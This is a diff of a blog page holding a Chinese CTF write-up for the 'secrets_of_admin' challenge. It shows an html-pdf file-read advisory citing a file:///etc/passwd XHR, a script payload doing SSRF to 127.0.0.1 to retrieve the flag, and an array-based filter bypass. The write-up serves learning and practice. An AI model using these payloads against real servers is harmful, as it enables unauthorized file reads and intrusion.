@@ -201,7 +201,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 07, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2291</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2098</span>
     </div>
   </div>
 </section>
@@ -214,26 +214,26 @@
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/178150.html">Linux下几种反弹Shell方法的总结与理解 - FreeBuf网络安全行业门户</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.wlhhlc.top/posts/20107/#cralwer-z">2021祥云杯WEB-WP | dota_st (wlhhlc.top)</a></p>
 <h4 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h4><p>打开后页面如下：</p>
-<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908114725080.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210908114725080</span></p>
+<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908114725080.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210908114725080"></p>
 <p>database.js里直接给出用户名和密码：</p>
 <p>Username：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">admin</span><br></code></pre></td></tr></table></figure>
 
 <p>Password：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">e<span class="hljs-number">365655e013</span>ce<span class="hljs-number">7</span>fdbdbf<span class="hljs-number">8</span>f<span class="hljs-number">27</span>b<span class="hljs-number">418</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>fe<span class="hljs-number">6</span>dc<span class="hljs-number">9354</span>dc<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">0328</span>fa<span class="hljs-number">02</span>b<span class="hljs-number">0</span>ea<span class="hljs-number">547659645</span><br></code></pre></td></tr></table></figure>
 
 <p>登录后就有了上传界面</p>
-<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908114945704.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210908114945704</span></p>
+<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908114945704.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210908114945704"></p>
 <p>提示我们上传pdf类型的文件，又只能post传参</p>
 <p>以下直<code>files</code>表可以知道，flag在<code>superuser</code>那里，但是<code>superuser</code>不能用。通过下面三行代码也可以知道，需要把<code>flag</code>给<code>admin</code>用户接摘抄wp（因为我没源码）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let filename &#x3D; await DB.getFile(token.username, req.params.id)</span><br><span class="line">         if (fs.existsSync(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)))&#123;</span><br><span class="line">             return res.send(await readFile(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">let</span> filename = await <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DB</span>.</span></span>get<span class="hljs-constructor">File(<span class="hljs-params">token</span>.<span class="hljs-params">username</span>, <span class="hljs-params">req</span>.<span class="hljs-params">params</span>.<span class="hljs-params">id</span>)</span><br>         <span class="hljs-keyword">if</span> (fs.exists<span class="hljs-constructor">Sync(<span class="hljs-params">path</span>.<span class="hljs-params">join</span>(<span class="hljs-params">__dirname</span> , <span class="hljs-string">&quot;../files/&quot;</span>, <span class="hljs-params">filename</span>)</span>))&#123;<br>             return res.send(await read<span class="hljs-constructor">File(<span class="hljs-params">path</span>.<span class="hljs-params">join</span>(<span class="hljs-params">__dirname</span> , <span class="hljs-string">&quot;../files/&quot;</span>, <span class="hljs-params">filename</span>)</span>));<br><br></code></pre></td></tr></table></figure>
 
 <p>但是/api/files/功能那里需要SSRF。</p>
 <p>通过查找html-pdf库发现它存在一个任意文件读取：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html-pdf before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as request.open(&quot;GET&quot;,&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;) will result in a PDF document with the contents of &#x2F;etc&#x2F;passwd.</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">html-pdf <span class="hljs-keyword">before</span> <span class="hljs-built_in">version</span> <span class="hljs-number">3.0</span><span class="hljs-number">.1</span> is vulnerable <span class="hljs-built_in">to</span> Arbitrary File Read. The package fails <span class="hljs-built_in">to</span> sanitize <span class="hljs-keyword">the</span> HTML input, allowing attackers <span class="hljs-built_in">to</span> exfiltrate server <span class="hljs-built_in">files</span> <span class="hljs-keyword">by</span> supplying malicious HTML code. XHR requests <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> HTML code are executed <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> server. Input <span class="hljs-keyword">with</span> <span class="hljs-keyword">an</span> XHR request such <span class="hljs-keyword">as</span> request.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>) will <span class="hljs-built_in">result</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> PDF document <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> contents <span class="hljs-keyword">of</span> /etc/passwd.<br></code></pre></td></tr></table></figure>
 
 <p>因此可以利用制造pdf的功能来实现ssrf，把flag给admin用户。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=1&quot;</span>, <span class="literal">true</span>);xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;<br><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=1&quot;</span>, <span class="hljs-literal">true</span>);xhr.send();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
 <p>而且filename字段是UNIQUE，需要不能直接flag，用./flag。</p>
 <p>但是有个问题就是这个过滤：</p>
@@ -243,12 +243,12 @@
 &#125; else &#123;</code></pre>
 <p>当时自己就卡在了这里，不知道怎么绕过。关键就在于node.js的弱类型和php的弱类型有所不同。js中数组和字符串拼接的话，比如[“hello”]+”world”，得到的是helloworld，而php里确实Arrayworld。也是因为深受php的影响，所以没想到这里可以用数组来绕过，记得URL编码</p>
 <p>然后我是丢进bp里，只需要content改成content[],传数组</p>
-<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908115802410.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210908115802410</span></p>
-<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908120122404.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210908120122404</span></p>
+<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908115802410.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210908115802410"></p>
+<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908120122404.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210908120122404"></p>
 <p>出现这个页面就是成功</p>
-<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908120634020.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210908120634020</span></p>
+<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908120634020.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210908120634020"></p>
 <p>打开后就有flag</p>
-<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908120715884.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210908120715884</span></p>
+<p><img   class="lazyload" data-original="/2021/09/07/2021/buu/21/image-20210908120715884.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210908120715884"></p>
 
       </section>
       <section class="extra">
